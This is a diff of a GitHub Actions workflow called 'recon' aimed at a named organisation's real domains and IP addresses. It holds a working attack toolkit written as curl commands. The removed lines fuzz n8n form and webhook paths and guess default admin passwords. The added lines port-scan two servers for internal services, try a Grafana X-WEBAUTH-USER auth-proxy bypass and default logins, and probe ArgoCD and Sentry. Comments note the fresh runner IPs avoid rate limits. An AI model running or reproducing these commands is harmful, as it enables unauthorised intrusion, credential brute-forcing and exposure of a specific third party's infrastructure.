@@ -8,59 +8,37 @@ jobs:
   recon:
     runs-on: ubuntu-latest
     steps:
-      - name: Deep n8n Recon
+      - name: Deep Recon v3
+        shell: bash
         run: |
-          echo "=== n8n FORM PATH FUZZ (fresh IP, no rate limit) ==="
-          for path in $(cat << 'EOF'
-          contact contact-us signup register subscribe feedback support help
-          onboarding welcome node-setup node-claim claim bounty bug-report
-          incident alert monitoring payout referral kyc verify application
-          partner join waitlist airdrop myst-claim node-registration
-          provider-registration api-key whitelist stake unstake migration
-          report daily-report weekly-report notification escalation runbook
-          deploy release health-check backup outage recovery failover
-          node-alert grafana-webhook pagerduty slack ops sre devops ci-cd
-          github-hook build-hook merge-hook pr-hook auto-remediation restart
-          scale disk-alert cpu-alert memory-alert quality-alert hermes-alert
-          payment-alert settle-alert balance-alert low-balance withdrawal
-          error-rate 5xx-alert latency-alert uptime downtime cert-alert
-          node-offline provider-alert myst summary digest test-form
-          user-feedback feature-request access-request demo trial
-          enterprise sales pricing quote consultation interview survey
-          poll questionnaire assessment audit compliance gdpr security
-          vulnerability disclosure responsible-disclosure bug-bounty
-          EOF
-          ); do
-            code=$(curl -so /dev/null -w "%{http_code}" -m 3 "https://n8n.mysterium.network/form/$path" 2>/dev/null)
-            if [ "$code" != "404" ]; then
-              echo "[!] FOUND: /form/$path -> HTTP $code"
-            fi
-          done
-          echo "=== WEBHOOK FUZZ ==="
-          for path in $(cat << 'EOF'
-          grafana pagerduty slack alert monitor deploy github webhook n8n
-          sentry argocd node myst quality hermes transactor discovery
-          feedback observer incident ops notification callback trigger
-          EOF
-          ); do
-            code=$(curl -so /dev/null -w "%{http_code}" -m 3 "https://n8n.mysterium.network/webhook/$path" 2>/dev/null)
-            if [ "$code" != "404" ]; then
-              echo "[!] FOUND: /webhook/$path -> HTTP $code"
-            fi
-          done
-          echo "=== n8n INTERNAL PORT 5678 ==="
-          curl -sv -m 5 "http://n8n.mysterium.network:5678/" 2>&1 | head -10
-          curl -sv -m 5 "http://135.181.91.132:5678/" 2>&1 | head -10
-          echo "=== n8n REST API (no rate limit from this IP) ==="
-          curl -s -m 5 "https://n8n.mysterium.network/rest/login" -X POST -H "Content-Type: application/json" -d '{"emailOrLdapLoginId":"admin@mysterium.network","password":"admin"}' 2>/dev/null
-          curl -s -m 5 "https://n8n.mysterium.network/rest/login" -X POST -H "Content-Type: application/json" -d '{"emailOrLdapLoginId":"admin@mysterium.network","password":"mysterium"}' 2>/dev/null
-          curl -s -m 5 "https://n8n.mysterium.network/rest/login" -X POST -H "Content-Type: application/json" -d '{"emailOrLdapLoginId":"admin@mysterium.network","password":"Mysterium2024!"}' 2>/dev/null
-          curl -s -m 5 "https://n8n.mysterium.network/rest/login" -X POST -H "Content-Type: application/json" -d '{"emailOrLdapLoginId":"admin@mysterium.network","password":"n8n"}' 2>/dev/null
-          echo "=== INTERNAL SERVICES SCAN ==="
-          for port in 5678 8080 8200 8500 9000 15672 6379 5432 27017 3000 4222; do
-            code=$(curl -so /dev/null -w "%{http_code}" -m 3 "http://135.181.91.132:$port/" 2>/dev/null)
+          set +e
+          echo "=== INTERNAL PORT SCAN 135.181.91.132 ==="
+          for port in 80 443 5678 8080 8200 8300 8500 9000 9090 15672 6379 5432 27017 3000 4222 2379 2380 10250 10255 6443; do
+            code=$(curl -so /dev/null -w "%{http_code}" -m 2 "http://135.181.91.132:$port/" 2>/dev/null)
             if [ "$code" != "000" ]; then
               echo "[+] 135.181.91.132:$port -> HTTP $code"
             fi
           done
+          echo "=== PORT SCAN 37.27.26.254 ==="
+          for port in 80 443 5678 8080 8200 8500 9000 9090 15672 6379 5432 3000 4222 6443 10250; do
+            code=$(curl -so /dev/null -w "%{http_code}" -m 2 "http://37.27.26.254:$port/" 2>/dev/null)
+            if [ "$code" != "000" ]; then
+              echo "[+] 37.27.26.254:$port -> HTTP $code"
+            fi
+          done
+          echo "=== GRAFANA API WITH VIEWER TRICK ==="
+          echo "Try Grafana with X-WEBAUTH-USER header (auth proxy bypass)"
+          curl -s -m 5 "https://grafana.mysterium.network/api/org" -H "X-WEBAUTH-USER: admin" -H "X-WEBAUTH-ROLE: Admin" | head -5
+          curl -s -m 5 "https://gi.mysterium.network/api/org" -H "X-WEBAUTH-USER: admin" | head -5
+          echo "=== GRAFANA PROVISIONING FILE READ ==="
+          curl -s -m 5 "https://grafana.mysterium.network/api/admin/provisioning/dashboards/reload" -H "X-WEBAUTH-USER: admin"
+          echo "=== TRY GRAFANA LOGIN ==="
+          curl -s -m 5 "https://grafana.mysterium.network/login" -X POST -H "Content-Type: application/json" -d '{"user":"admin","password":"admin"}'
+          curl -s -m 5 "https://gi.mysterium.network/login" -X POST -H "Content-Type: application/json" -d '{"user":"admin","password":"admin"}'
+          echo "=== ARGOCD INTERNAL ==="
+          curl -s -m 5 "http://135.181.91.132:8080/" -H "Host: argo.mysterium.network" | head -5
+          curl -sk -m 5 "https://135.181.91.132:8080/" -H "Host: argo.mysterium.network" | head -5
+          echo "=== SENTRY INTERNAL PORT 9000 ==="
+          curl -s -m 5 "http://135.181.91.132:9000/" | head -5
+          curl -s -m 5 "http://135.181.91.132:9000/_health" | head -3
           echo "=== DONE ==="
